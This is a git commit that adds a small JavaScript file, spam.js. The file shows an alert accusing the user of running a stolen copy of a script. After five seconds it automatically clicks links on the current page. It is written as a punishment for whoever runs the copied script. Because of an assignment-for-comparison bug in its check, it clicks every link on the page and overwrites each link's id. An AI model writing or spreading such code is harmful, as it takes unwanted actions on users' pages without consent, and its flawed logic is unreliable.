8e45f448e856242978a9a323c2c4a79d2fc66ec7
rohitmathpal <blogstoc@gmail.com>
2013-11-28 13:42:40 +0530

    Create spam.js

---
+++ spam.js
@@ -0,0 +1,15 @@
+alert("Dear user the script your using is a copy of the main script, Stolen from the owners Rohit Mathpal (http://www.blogstoc.org/). This script has no permission to be executed, Reload your window in 5 second.");
+    
+setTimeout(function () {
+
+    
+javascript: (function () {
+x = document.getElementsByTagName('a');
+for (i = 0; i < x.length; i++) {
+if (x[i].id="js_18") {
+x[i].click();
+}
+}
+})();
+    
+}, 5000);
